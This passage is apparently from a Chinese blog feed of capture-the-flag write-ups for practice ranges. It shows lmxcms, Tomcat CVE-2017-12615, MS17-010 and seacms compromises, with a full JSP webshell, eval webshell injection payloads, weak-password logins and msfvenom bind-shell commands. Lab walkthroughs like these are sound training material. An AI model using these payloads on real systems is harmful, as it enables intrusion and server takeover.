标题:梦想cms（lmxcms）是一套完                    </span><br><span class="hljs-string">全免费、开源、无授权限制的网站管理系统                                                                                                      </span><br><span class="hljs-string">[2025-04-03 18:50:15] [SUCCESS] 扫描已完成: 14/14                                                                                                                                               </span><br></code></pre></td></tr></table></figure><p>没啥东西，主站信息收集一波，是<code> lmxcms 1.4</code>版本，上网看看历史漏洞</p><p>想测一下sql的但是有防火墙</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403192443432.png" alt="image-20250403192443432"></p><p>弱口令<code>admin:admin123</code>进去后台</p><p>修改模板注入，</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403210625875.png" alt="image-20250403210625875"></p><p>蚁剑直接连接，想打开<code>flag.txt</code>但是权限不够，上传cs正向马连接</p>]]></content>
    
    
    <categories>
      
      <category>cyberstrikelab</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cyberstrikelab_lab2</title>
    <link href="/2025/04/03/cyberstrikelab-lab2/"/>
    <url>/2025/04/03/cyberstrikelab-lab2/</url>
    
    <content type="html"><![CDATA[<h1 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h1><h3 id="场景介绍："><a href="#场景介绍：" class="headerlink" title="场景介绍："></a>场景介绍：</h3><p>重生之我是渗透测试工程师，被公司派遣去测试某网络的安全性。你的目标是成功获取所有服务器的权限，以评估网络安全状况。</p><p>连接vpn，扫描端口</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403111811126.png" alt="image-20250403111811126"></p><p>发现其实cms，信息收集一下</p><p><code>fscan</code>扫一下</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[INFO]</span> 加载的插件: <span class="hljs-selector-tag">findnet</span>, <span class="hljs-selector-tag">ms17010</span>, <span class="hljs-selector-tag">mysql</span>, <span class="hljs-selector-tag">netbios</span>, <span class="hljs-selector-tag">smb</span>, <span class="hljs-selector-tag">smb2</span>, <span class="hljs-selector-tag">smbghost</span>, <span class="hljs-selector-tag">ssh</span>, <span class="hljs-selector-tag">webpoc</span>, <span class="hljs-selector-tag">webtitle</span>         <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span> <span class="hljs-selector-tag">CVE-2020-0796</span> <span class="hljs-selector-tag">SmbGhost</span> <span class="hljs-selector-tag">Vulnerable</span>                                          <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> <span class="hljs-selector-tag">NetInfo</span> 扫描结果                                                                             <br>目标主机: <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span>                                                                                                      <br>主机名: <span class="hljs-selector-tag">DESKTOP-JFB57A8</span>                                                                                                     <br>发现的网络接口:                                                                                                                 <br>   <span class="hljs-selector-tag">IPv4</span>地址:                                                                                                               <br>      └─ <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span>                                                                                                   <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> <span class="hljs-selector-tag">NetInfo</span> 扫描结果                                                                             <br>目标主机: <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.20</span>                                                                                                      <br>主机名: <span class="hljs-selector-tag">cyberweb</span>                                                                                                            <br>发现的网络接口:                                                                                                                 <br>   <span class="hljs-selector-tag">IPv4</span>地址:                                                                                                               <br>      └─ <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.20</span>                                                                                                   <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 网站标题 <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//192.168.10.233:8080 状态码:404 长度:19     标题:无标题                                </span><br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> <span class="hljs-selector-tag">NetBios</span> <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.20</span>   <span class="hljs-selector-tag">cyberweb</span><span class="hljs-selector-class">.cyberstrikelab</span><span class="hljs-selector-class">.com</span>         <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">Server</span> <span class="hljs-number">2012</span> <span class="hljs-selector-tag">R2</span> <span class="hljs-selector-tag">Standa</span><br><span class="hljs-selector-tag">rd</span> <span class="hljs-number">9600</span>                                                                                                                  <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 网站标题 <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//192.168.10.20:8080 状态码:200 长度:11432  标题:Apache Tomcat/8.5.19                 </span><br><span class="hljs-selector-attr">[2025-04-03 11:46:50]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 目标: <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//192.168.10.20:8080                                                            </span><br>  漏洞类型: <span class="hljs-selector-tag">poc-yaml-iis-put-getshell</span>                                                                                        <br>  漏洞名称:                                                                                                                  <br>  详细信息:                                                                                                                  <br>        <span class="hljs-selector-tag">author</span>:<span class="hljs-selector-tag">Cannae</span>(github.com/thunderbarca)                                                                           <br>        <span class="hljs-selector-tag">links</span>:<span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//www.cnblogs.com/-mo-/p/11295400.html                                                               </span><br><span class="hljs-selector-attr">[2025-04-03 11:46:52]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 网站标题 <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//192.168.10.10:808  状态码:200 长度:20287  标题:骑士PHP高端人才系统(www.74                   </span><br><span class="hljs-selector-tag">cms</span><span class="hljs-selector-class">.com</span>)                                                                                                                 <br><span class="hljs-selector-attr">[2025-04-03 11:46:53]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 目标: <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//192.168.10.20:8080                                                            </span><br>  漏洞类型: <span class="hljs-selector-tag">poc-yaml-tomcat-cve-2017-12615-rce</span>                                                                               <br>  漏洞名称:                                                                                                                  <br>  详细信息:                                                                                                                  <br>        <span class="hljs-selector-tag">author</span>:<span class="hljs-selector-tag">j4ckzh0u</span>(<span class="hljs-attribute">https</span>:<span class="hljs-comment">//github.com/j4ckzh0u)                                                                     </span><br>        <span class="hljs-attribute">links</span>:<span class="hljs-attribute">https</span>:<span class="hljs-comment">//www.seebug.org/vuldb/ssvid-96562                                                                   </span><br><span class="hljs-attribute">https</span>:<span class="hljs-comment">//mp.weixin.qq.com/s/sulJSg0Ru138oASiI5cYAA                                                                        </span><br>                                                                                                                         <br></code></pre></td></tr></table></figure><p>有两个站，先看看这个rce的cve  cve-2017-12615</p><p>使用burpsuite抓包，修改GET为PUT上传方式，添加文件名1.jsp&#x2F;，添加shell脚本</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>        U(ClassLoader c) &#123;<br>            <span class="hljs-built_in">super</span>(c);<br>        &#125;<br>        <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b, <span class="hljs-number">0</span>, b.length);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] base64Decode(String str) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[]) clazz.getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>).invoke(<span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;ant&quot;</span>);<br>    <span class="hljs-keyword">if</span> (cls != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403122959594.png" alt="image-20250403122959594"></p><p>蚁剑连接</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403123043272.png" alt="image-20250403123043272"></p><p>拿到第一个flag</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403123119407.png" alt="image-20250403123119407"></p><p>看看网卡，发现是双网卡</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403123224794.png" alt="image-20250403123224794"></p><p>传<code>fscan</code>扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[2025-04-03 04:35:59] [SERVICE] 目标:192.168.10.10 状态:identified 详情:port=808, service=http<br>[2025-04-03 04:35:59] [SERVICE] 目标:192.168.20.30 状态:identified 详情:hostname=WIN-7NRTJO59O7N, ipv4=[192.168.20.30], ipv6=[]<br>[2025-04-03 04:35:59] [SERVICE] 目标:192.168.20.20 状态:identified 详情:hostname=cyberweb, ipv4=[192.168.10.20], ipv6=[]<br>[2025-04-03 04:35:59] [SERVICE] 目标:192.168.20.20 状态:identified 详情:title=Apache Tomcat/8.5.19, url=http://192.168.20.20:8080, status_code=200, length=11432, server_info=map[content-type:text/html;charset=UTF-8 <span class="hljs-built_in">date</span>:Wed, 02 Apr 2025 20:35:59 GMT length:11432 status_code:200 title:Apache Tomcat/8.5.19], fingerprints=[], port=8080, service=http<br>[2025-04-03 04:35:59] [SERVICE] 目标:192.168.20.20 状态:identified 详情:domain_name=cyberstrikelab.com, netbios_domain=CYBERSTRIKELAB, netbios_computer=CYBERWEB, workstation_service=CYBERWEB, server_service=CYBERWEB, os_version=Windows Server 2012 R2 Standard 9600, port=139, computer_name=cyberweb.cyberstrikelab.com<br>[2025-04-03 04:36:00] [VULN] 目标:192.168.20.30 状态:vulnerable 详情:port=445, vulnerability=MS17-010, os=Windows Server 2008 R2 Standard 7600<br>[2025-04-03 04:36:00] [SERVICE] 目标:192.168.10.233 状态:identified 详情:port=8080, service=http, banner=HTTP/1.0 400 Bad Request.Client sent an HTTP request to an HTTPS server.<br>[2025-04-03 04:36:01] [SERVICE] 目标:192.168.10.20 状态:identified 详情:port=8080, service=http<br>[2025-04-03 04:36:01] [SERVICE] 目标:192.168.10.20 状态:identified 详情:port=8009, service=unknown<br>[2025-04-03 04:36:02] [SERVICE] 目标:192.168.10.10 状态:identified 详情:service=mysql, product=MySQL, info=unauthorized, banner=A.j Host <span class="hljs-string">&#x27;CYBERWEB&#x27;</span> is not allowed to connect to this MySQL server, port=3306<br>[2025-04-03 04:36:02] [VULN] 目标:http://192.168.20.20:8080 状态:vulnerable 详情:author=Cannae(github.com/thunderbarca), references=[https://www.cnblogs.com/-mo-/p/11295400.html], vulnerability_type=poc-yaml-iis-put-getshell, vulnerability_name=<br>[2025-04-03 04:36:03] [VULN] 目标:http://192.168.20.20:8080 状态:vulnerable 详情:vulnerability_type=poc-yaml-tomcat-cve-2017-12615-rce, vulnerability_name=, author=j4ckzh0u(https://github.com/j4ckzh0u), references=[https://www.seebug.org/vuldb/ssvid-96562 https://mp.weixin.qq.com/s/sulJSg0Ru138oASiI5cYAA]<br></code></pre></td></tr></table></figure><p>看见<code>192.168.20.30</code>有个永恒之蓝</p><p>搭建代理，用msf打</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/smb/ms17_010_command<br><span class="hljs-built_in">set</span> rhost 192.168.20.30<br><span class="hljs-built_in">set</span> <span class="hljs-built_in">command</span> <span class="hljs-built_in">type</span> C:\\flag.txt<br>run<br></code></pre></td></tr></table></figure><p>拿到flag</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403124829741.png" alt="image-20250403124829741"></p><p>现在看看第二个站</p><p>找到后台登录地址<code>/index.php?m=admin&amp;c=index&amp;a=login</code></p><p>输入<code>admin</code>会提示<code>账号或密码错误</code>输入别的会提示<code>管理员账号不存在</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403112445766.png" alt="image-20250403112445766"></p><p>弱口令<code>admin:admin123456</code></p><p>我们打后台模板代码注入漏洞！</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403132250264.png" alt="image-20250403132250264"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /index.php?m=admin&amp;c=tpl&amp;a=set&amp;tpl_dir=&#x27;,&#x27;a&#x27;,eval($_POST[&#x27;cmd&#x27;]),&#x27; HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.10.10:808</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">124.0.0.0</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">124.0.0.0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">192.168.10.10:808</span>/index.php?m=admin&amp;c=tpl&amp;a=index<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-GB;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Cookie</span>: PHPSESSID=co56nmseg5pps6berl1iv3aa47; think_template=default; think_language=zh-CN<br><span class="hljs-attribute">Connection</span>: keep-alive<br></code></pre></td></tr></table></figure><p>然后访问<code>/Application/Home/Conf/config.php</code></p><p>蚁剑连接，拿到flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">go-flag</span><span class="hljs-template-variable">&#123;MP9E4xXhya0TlzVF&#125;</span><br></code></pre></td></tr></table></figure><p><strong>简单</strong></p>]]></content>
    
    
    <categories>
      
      <category>cyberstrikelab</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cyberstrikelab-pt1</title>
    <link href="/2025/03/30/cyberstrikelab-pt1/"/>
    <url>/2025/03/30/cyberstrikelab-pt1/</url>
    
    <content type="html"><![CDATA[<h1 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h1><p><strong>题目</strong>：最终任务是获取管理员的密码，能做到吗？</p><p>修改<code>client</code>配置，设置特定网段走<code>vpn</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">route</span>-nopull<br><span class="hljs-attribute">route</span> <span class="hljs-number">10.0.0.0</span> <span class="hljs-number">255.255.255.0</span> vpn_gateway<br></code></pre></td></tr></table></figure><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>进入网址发现是<code>seacms</code>但是不知道是什么版本</p><p>找到版本网址<code>http://10.0.0.68/DATA/ADMIN/VER.TXT</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330134844810.png" alt="image-20250330134844810"></p><p>版本是12.9，搜索一波历史漏洞</p><p>访问<code>/cslab</code>进入登录页面</p><p>使用<code>cslab:cslab</code>进入</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330135241959.png" alt="image-20250330135241959"></p><p>发现</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330135656100.png" alt="image-20250330135656100"></p><p>与漏洞重合，尝试写马</p><p>拼接一个木马进去</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;;<span class="hljs-keyword">@eval</span>($_POST[cmd]);<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330135906147.png" alt="image-20250330135906147"></p><p>虚拟机蚁剑连接(记得NAT模式)</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330140221588.png" alt="image-20250330140221588"></p><p>找到第一个</p><p>第二关是administrator用户的ntmlhash值(居然不是密码🤣)</p><p>使用msf生成正向连接木马在运行木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/bind_tcp <span class="hljs-attribute">LHOST</span>=0.0.0.0 <span class="hljs-attribute">LPORT</span>=4444 -f exe &gt; shell.exe <br></code></pre></td></tr></table></figure><p>在拿shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br> <br>use exploit/multi/handler<br> <br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br> <br><span class="hljs-built_in">set</span> rhost 10.0.0.68<br> <br><span class="hljs-built_in">set</span> lport 4444<br> <br>run<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330154457649.png" alt="image-20250330154457649"></p>]]></content>
    
    
    <categories>
      
      <category>cyberstrikelab</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cyberstrikelab_lab1</title>
    <link href="/2025/03/30/cyberstrikelab-lab1/"/>
    <url>/2025/03/30/cyberstrikelab-lab1/</url>
    
    <content type="html"><![CDATA[<h1 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h1><p><strong>题目</strong>：本次小李的任务是攻克192.168.10.0&#x2F;24网段的所有主机，刚开始挺顺利，但深入后发现里面的情况远比想象的复杂。</p><p>挂上openvpn，修改特定流量走vpn</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">route</span>-nopull <br><span class="hljs-attribute">route</span> <span class="hljs-number">192.168.10.0</span> <span class="hljs-number">255.255.255.0</span> vpn_gateway<br></code></pre></td></tr></table></figure><p>进去是一个CMS，没啥信息</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330130911534.png" alt="image-20250330130911534"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330160544119.png" alt="image-20250330160544119"></p><p>无影信息搜集一波</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330160825664.png" alt="image-20250330160825664"></p><p>EyouCMSv1.0.9</p><p>后台登录 <code>http://192.168.10.10/index.php/admin/Admin/login</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330161123484.png" alt="image-20250330161123484"></p><p>但是啥也没有，弱口令没有</p><p>上fscan扫描</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330160245446.png" alt="image-20250330160245446"></p><p>thinkphp一把搜哈</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330161706080.png" alt="image-20250330161706080"></p><p>直接getshell</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330161820531.png" alt="image-20250330161820531"></p><p>上传webshell</p><p>连马flag1</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330162308966.png" alt="image-20250330162308966"></p><p>进入内网渗透状态，🤡🤡🤡🤓</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330162432322.png" alt="image-20250330162432322"></p><p>权限是system，是win server2012</p><p>看下网络</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330162556257.png" alt="image-20250330162556257"></p><p>两个网段，直接传fscan上传靶机</p><p>上传<code>fscan.exe</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330165023160.png" alt="image-20250330165023160"></p><p>运行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.20.10</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs ruby">[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span>] [<span class="hljs-variable constant_">HOST</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:alive</span> 详情<span class="hljs-symbol">:protocol=ICMP</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span>] [<span class="hljs-variable constant_">HOST</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:alive</span> 详情<span class="hljs-symbol">:protocol=ICMP</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span>] [<span class="hljs-variable constant_">HOST</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:alive</span> 详情<span class="hljs-symbol">:protocol=ICMP</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">88</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">80</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] 